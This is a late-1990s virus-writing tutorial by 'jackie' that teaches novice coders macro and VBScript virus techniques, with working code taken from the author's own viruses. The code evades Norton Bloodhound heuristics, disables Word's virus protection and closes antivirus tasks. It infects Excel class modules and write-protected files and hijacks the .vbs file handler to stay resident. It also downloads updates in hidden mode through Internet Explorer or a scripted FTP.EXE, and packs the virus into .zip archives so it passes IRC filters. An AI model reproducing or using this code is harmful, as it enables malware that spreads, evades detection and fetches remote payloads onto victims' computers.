.Introduction

 Hi there kids, this is your phunky ol' retired friend (!) back with another
sloppy tutorial about four elephants on a tourtoise. In this essay I'm going
to talk about some  kewl topics concerning coding  viruses in VBx. Check the
short table of contents.

 .Antiheuristic for the mass
 .Language and user independent coding
 .Infection of write-protected files
 .VBScript infection - The jackie theory
 .Virus Update via WWW
 .Winzip archives and viruses

 As you see,  more or less no one of all you macro coders out there plays a-
round with these stuff,  except a few guys (the old punks,  hehehe, hi there
guys!) sat down for a while and thought about technics like these. As a fact
out of this,  your creations get  detect as Class.xx, Marker.xx,  Across.xx,
LoveLetter.xx, and so on, as you see, it seems like all your stuff is hacked
shit for the AV community. Well, oh boy, the answer is easy, because most of
you guys just use old technics,  old sceme's, old shit, old hacks instead of
sitting down, thinking, trying and researching.  As output we can see masses
of lame macros. That's why there are 36 variants of Marker, because you guys
just change this and that in code, not because Spo0ky has written all of 'em
that was you guys.  X-D And one thing you should have in front of your eyes,
what counts in VX  community is the quality of coding  and not the quantity.
No one will care if you write 1000s of  viruses which are all just hacks and
strains.  My friends, it's time to wake up and realize  that virus coding is
not a thing of  destruction, it's a thing of art.  Every single line of code
represents it's coder. I know that there are too much lame wanna-be 'coders'
around which behave like the sickest guys on earth with the 'Yo, man, I code
virii man,  get outta my way man!' attitude.  These are the ones that try to
show off in front of their  computer - friends. These are the ones that rep-
lace original signatures and names  in original authors code and claim to be
a virus writer. Hihihi.  If you are such a guy,  I feel very sorry  for your
poor stupid mind. It's time to change young coder.  Otherwise you will never
get it and you will  never be accepted and understood.  The best example for
lameness and attitude  problems combined with  the topic of viruses,  is the
virus section of  the messageboard on a german ' hackers ' site. Viruses are
not made to destroy  data of your ex-friend,  etc get that kiddies.  I could
talk and discust about  these guys hours and hours, but this is not topic of
this paper.  I'm sorry dear reader,  but I do not want you to  get like that
lamer's around the cyberspace. X-D So, after that short column about general
attitude, we can start with our first topic today, let see what we will have
before going to bed...


.Antiheuristic for the mass

 I see, ya're still here young coder. Okies,  let see what we got for today.
I am gonna tell you about the thing called 'Antiheuristics'. Well, some time
ago, the AV community decided to use such a thing as 'Heuristic' to scan for
viruses, which really helped 'em a lot to detect viruses, and they still use
it. XD.  Ok, as you might have realized,  it's some kinda special technic to
detect viruses and the thing we can do is called 'Antiheuristic',  which are
technics  that can avoid heuristic  detection of your virus.  If you are the
proud owner of a copy of Norton AntiVirus 5.X or higher, you might have not-
iced that thing which is called ' Bloodhound '. Heh, this is NAV's heuristic
engine.  Pretty rad. XD. I think you have had your  expiriences with it, but
it's really easy to fake and I will show you how.

 First you must get in your head that the best medicine against heuristic is
a ' strange ' coding style.  I mean, try to code not in the normal way, your
code might look strange, but, it's not detected. XD. For general information
about easy anti - heuristic coding please refer to my other  tutorial called
'A phreaky macro primer'. You should find some basics in chapter 15.

 Okies, well, an easy technic to fake bloodhound, is to use objects in a ph-
reaky way. Just look at that.

   Set objPhreaky = Word.Application.Application.Application.ActiveDocument

 I used the object ' Application ' three times, result is that the heuristic
won't get it as it is meant to be.

   varPhreaky = VBA.Chr(54) & VBA.Chr(54) & VBA.Chr(54)

 As you can see, I used the object 'VBA' infront,  which has the same result
for our purpose, but it fakes the heuristic.

   Word.Application.Options.VirusProtection = j

 Again, the object ' Word ' infront and something special behind, a variable
without type and value. It werks! XD

   j = j + 1
   Set objCheesy = Word.Application.VBProject.VBComponents(j).CodeModule

 I replaced the '1' for the component with a variable with the value '1'. It
is just a basic trick.

   Set objCheesy = Word.Application.VBProject _
                   .VBComponents(CDec(CInt(Abs(1)))).CodeModule
   
 As you can see, it looks strange, but it werks fine. You might have noticed
what I mean with 'strange' - coding style. XD.  To fake a heuristic you just
need to sit down for a while and think, try, research as I said before. Well
this were some methods to code  antiheuristic code and another one is to add
encryption, remove obvious commands, etc. I hope you got what anti-heuristic
means and what's it's purpose on virus coding.  Btw, here are three lines of
code that have  not so much to  do with anti - heuristic but with killing AV
monitors. It's take from my W97M.Co0kie virus XD. Enjoy!

   For y = 1 To Tasks.Count
    If InStr(1, LCase(Tasks(y).Name), "vir") Then Tasks(y).Close
   Next

 This little piece of code does not more than kill all tasks that could be a
virus scanner. XD.

 In the end of the  chapter about anti - heuristic I wanted to tell you that
you can use this technics in all areas, not only in Word. XD. I just did the
Word compatible code as an example,  because most of you  have never touched
any other application.


.Language and user independent coding

 Dear young coder, you're still with me?  Kewlie. Okies, let me get you into
another chapter concerning 'language and user independent coding' this time.
As you coded your creations, or not, you might have noticed that if you want
ed to some stuff  like a worm script for mIRC,  or use Winzip,  or any other
application.  The key to our needs is to use the  registry to get all needed
information about the application we want to abuse.  For example I will show
you now how to get the 'Program files' directory.

   p = Application.System.PrivateProfileString("", _
       "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", _
       "ProgramFilesDir")

 This example werks for Word97, but it's easy to get the path from any other
Office application too.  Just export the regkey with the shell command using
'regedit.exe' and read it into a string  and use InStr(), Mid(),  etc to get
the needed string.  Easy, isn't it?  But I want YOU to code,  so no examples
for you. XD. Another example to  get the windows directory,  no matter if we
are in Win9X or WinNT, is to use the Environ() function. Lemme show you how.

   w = VBA.Environ("windir")

 This is a little effective  method to get the windows  directory without of
API use.

 Well, nearly all programs do have entrys  in the windows registry where you
can get informations like installation path, save directories, etc. Just try
to research a bit.  You can see that this is a kewl method to get dir's, etc
because every infected user could have windows in another directory than you
or anyone else,  even the directory for the programs.  So if you want to get
language independent use this tricks. XD.

 Another thing  I'm going to talk  about in  this paper  is the infection of
Excel class modules. Well, I'm pretty sure that 90% of you dear readers have
never touched Excel or any other application than Word to write macros. Ok,
there is something that was a stone in my way of infecting Excel class stuff
since the first one was born. Lemme give you a brief intro to it.

 The Excel class module can't be  accessed via stuff like using the ordinary
command like '.VBComponents(1)', because the first component varies in every
.xls file. So we were forced to use the name of the class module which is in
english versions of Excel named 'ThisWorkbook'.  Okies, so all viruses which
used this technic would  only work under the version  which they where hard-
coded for. ie 'DieseArbeitsmappe' for german version.

 As I had nothing better to do,  I sat down for a while and  thought about a
solution to fix this language problem. Well, as God wanted, I found a little
trick to solve the problem. The class module of every VBA project has a spe-
cial number of properties on which I could identify it as Class module. Look
at the piece of code below taken from my X97M.fireal,  the first class virus
that is able to spread  under all version of Excel, no matter what language.

   For Each fireal In ThisWorkbook.VBProject.VBComponents
    If fireal.Properties.Count = 73 Then _
     ourcode = fireal.codemodule.Lines(1, 22)
   Next

 First I walk through all the components and get the one I want and save the
virus code for later  use in a variable.  That's the  routine fireal uses to
get its code. And I use the same style to find new classes to infect.

   For Each fireal In book.VBProject.VBComponents
    If fireal.Properties.Count = 73

    [...]

    End If
   Next

 This technic is called 'Fireal-technic' and I'm sorry, I'm too stoned to re
member why it has such a name!?. XD. I should take some vitamin pills. Okies
I hope you got the  clue and understood what  I wanted to teach  y'all young
coders.


.Infection of write-protected files

 In this chapter I will tell  y'all something about  the infection of write-
protected files and how to infect them. You will see it's pretty easy to in-
fect write protected files, but it has one point that we have to notice. The
technic described here only  works under Word97 SR-1 or higher and Word2000.
Besides that there are two kinds of protection,  the normal write-protection
of windows  and the VBA  project protection.  We can't yet infect  documents
which are  protected by VBA,  but protected files by windows.  Okies,  let's
drop some code.

   If GetAttr(ActiveDocument.FullName) = 1 Then
    SetAttr ActiveDocument.FullName, 0
    ActiveDocument.Reload
   End If

   [...]

   SetAttr ActiveDocument.FullName, 1

 Use this code to infect write-protected documents and restore afterwards. I
won't show you how to do it with NormalTemplate because if you're too stupid
to find out for yourself you should drop this paper quick. Phuck, this chap-
ter is short. Nargh, well I'm sorry, there's not more to say about this shit
and I don't know any other technic to do it. XD.


.VBScript infection - The jackie theory

 Yummie, yummie.  I hope everything fits tight ... XD. While the world keeps
spinning around,  I am gonna tell the young coders out there something about
a phreaky way to infect .vbs files. Since .vbs viruses use this same old te-
chnic to search and infect files, I took some of my little time and invented
some new technic to do it. It has to do something with hooking, because each
.vbs file that gets executed gets infected too. Well, the theory is easy and
the example code too.  Let's see some code about the ' jackie theory of .vbs
infection'. First of all you need the arguments.

   Set objArguments = WScript.Arguments

 You can check for arguments using this...
 
   objArguments.Count

 And access them via this command...
 
   objArguments(0)
   objArguments(1)

 [...etc...]

 As you see, you can easy use this commands to make your .vbs virus kinda
resisdent. Just get the regkey of the .vbs shell, by using this:

   varCurrentShell = objShell.RegRead _
    ("HKEY_CLASSES_ROOT\VBSFile\Shell\Open\Command\")

 Now you add yourself to this shell command, for example the new shell would
be ' c:\windows\wscript.exe infinity.vbs %1 ' or kinda equal. Now every .vbs
file gets executed via your infected .vbs file. So it's an easy trick to get
the path and infect all the files in that path,  inclusive the executed .vbs
file. Ohhh , last but not least you have to  execute the just  infected .vbs
file by our virus, otherwise it wound run. Just use this.

   Set objShell = CreateObject("WScript.Shell")
   objShell.Run "wscript.exe" & chr(32) & objcommandline(0)

 That's all for that topic today. I wrote VBS/Infinity, which uses this tech
nic. Just toy a bit around with that code pieces. All is said and done. xD


.Virus Update via WWW

 Back with another topic today,  I am going to tell ya'll young coders about
a new interesting  technic in virus coding.  The vision of a  virus which is
capable to update itself via the WWW. Well, Vecna did it first (Ya rule man)
in Asm and I did it after that for all the macro people out there. xD.

 There are two technics which I researched, the first one is used my little
example virus called W97M/One. It uses (Radio)ActiveX to update itself. Just
take a close look at the code below.
 
   Set objNET = CreateObject("InternetExplorer.Application")
   Do While objNET.Busy
    VBA.DoEvents
   Loop
   objNET.Visible = 0
   objNET.Navigate "http://www.your-url-here.org/your-file-here.txt"
   Do While objNET.ReadyState <> 4
    VBA.DoEvents
   Loop
   sCode = objNET.Document.Body.innerText
   objNET.Quit

 Well, all we do is getting an ActiveX object, after that we make a loop un-
til our beloved IE is loaded.  Then we let IE load  our source code  file or
whatever and make a  loop again until IE loaded the file.  We store the text
which is our source code,  into a variable and voila, we have some new piece
of code in it, so it's your decision what you do with it now. xD.

 My W97M/One uses some ID and an internal version number to check for an up-
date. This helps if there was no active connection, or the file wasn't found
for any other reason. Just be creative, well, at least a bit.

 The second technic uses FTP.EXE to get file from the net. All you need is
an ftp where you can upload your updates. xD. 

 First open a file and print the following stuff in it.

   Open "c:\bla.ftp" For Output As #1
    Print #1, "open ftp.server.org"
    Print #1, "Your-User-Name"
    Print #1, "Your-Top-Secret-Password"
    Print #1, "cd /your-dir-here/"
    Print #1, "hash"
    Print #1, "bin"
    Print #1, "prompt"
    Print #1, "lcd c:\"
    Print #1, "mget your-file.ext"
    Print #1, "bye"
   Close #1

 Then launch FTP.EXE and download our stuff. xD

   Shell "c:\windows\ftp.exe -s:c:\bla.ftp", vbHide

 Now you should have your file on the users hdd and you can work with it but
it's not part of that paper to tell you how. Check it out for yourself. xD

 As you see, it's not the big deal, and as Mister Sandman says, the most im-
portant thing is to be creative. xD. Here you are! As I said, just toy a bit
with that.


.Winzip archives and viruses

 Fasten your seatbelt young coder,  in this last chapter of  'Four elephants
on a tortoise!' I'm gonna show you some of the lastest developements. I have
to say that this one is my favourite. XD.  I'm going to tell y'all about the
kewl tool Winzip and  it's viral capabilities.  What would you think if your
virus adds itself to every .zip archive  it can find on the user's pc? Rad?!
Aight! As you have to know,  I have nothing better to do than writing shitty
papers about elephants and tortoises,  just that you can learn  a bit out of
them.  Okies,  the first step to use  this kewl technic is  that you have to
check for the path where Winzip is installed on the local machine.

 As you read before you can use the  registry to get the needed information.
Would I be out of  line if I give you an example?  Naawww. XD.  Okies, let's
have here some code to learn. It's taken from my WM97/2000.Incubus.

   z = Application.System.PrivateProfileString("", _
          "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
          "\CurrentVersion\App Paths\winzip32.exe", "")

 We got the path of Winzip into the variable 'z'. XD. Well, that you know, I
am not going to show  you how to search for  .zip files. Use VBA commands or
do some  .vbs file as Incubus does.  After you got some .zip files,  you can
use the following to add your virus to the file.

   VBA.Shell z & " -a -r " & "YourFile.ZIP" _
    & Chr(32) & "Virus.EXT", vbHide

 I hope I needn't to say that your  file must have pathinformation included.
For example 'c:\pictures.zip' and  'c:\windows\hiddenvirus.doc' or something
like that. 

 If you are kinda involved into viral stuff, you might have noticed that you
can write IRC-worms  using the script language of mIRC,pIRCh, etc.  Btw, IRC
is the place  where we meet.  XD. Okies, enough.  There were  some worms and
viruses that spread through IRC-channels so the developer of mIRC, etc build
in some kinda protection against some filetypes. Actually all kewl filetypes
like .exe, .com, .vbs,  .doc, etc are ignored,  so I came to the idea to let
my macro zip itself to get save through the IRC-channels. XD. There are only
two viruses which do it, it's first Co0kie and second Incubus, both by ehm..
my humble person.  The concept is easy, the code too. Lemme drop you here an
example taken from Co0kie.

   z = Application.System.PrivateProfileString("", _
          "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
          "\CurrentVersion\App Paths\winzip32.exe", "")
   w = Environ("windir")

   VBA.Shell z & " -a -r " & w & "\co0kie.zip" _
    & Chr(32) & w & "\how_to_make_tasty_co0kies.zip", vbHide

 Basically it's the same  as the code above.  As you see,  it creates a .zip
file into the windows directory.  The best on this is that mIRC doesn't have
.zip files on it's damn auto-ignore phuckshit. XD.

 There are some other parameters for  Winzip which are more  or less usefull
for your viruses. Maybe you can need 'em. Use '-f' to renew the archive, '-m
' to move,  '-u' to update,  '-r' to include subdirs,  '-p' to include path,
'-ex' for maximum of compression, etc, etc...


.Outroduction

 Finally, another strange paper you read and I wrote, reaches it's end. Last
but not least, I have to mention a few kewl coders, which werk I really app-
reaciate and which is phuckin'rad.XD. I'm talking about guys like, Knowdeth,
LysKovick, Anti State Tortoise, VicodinES,  Spo0ky, Foxz and some others who
walked together with me through  the dark woods of new inovative macro tech-
nics. Thank you guys, you really did kewl werk!

 I dunno yet if there will be any new  stuff coming from my side,  because I
feel kinda lazy these days. A lot of shit happenend and is happening and I'm
kinda forced to leave things away.  Only thing left to say which fits lately
is 'mens sana in corpore sano', but I dunno if it fits for me. If I should
burst into the flames, I just want you to know that I love you all. xD

 The last column of this paper is dedicated as an appeal to all the new guys
that come outta ground from day to day.  If you wanna learn, you're welcome,
otherwise,  get the phuck outta our world.  So, in this sense, don't let the
world bring you don't young coder and remember,  whatever tomorrow brings, I
could be there...XD. Sleep tight and listen to Black Sabbath!


Mens sana in corpore sano,
 jackie
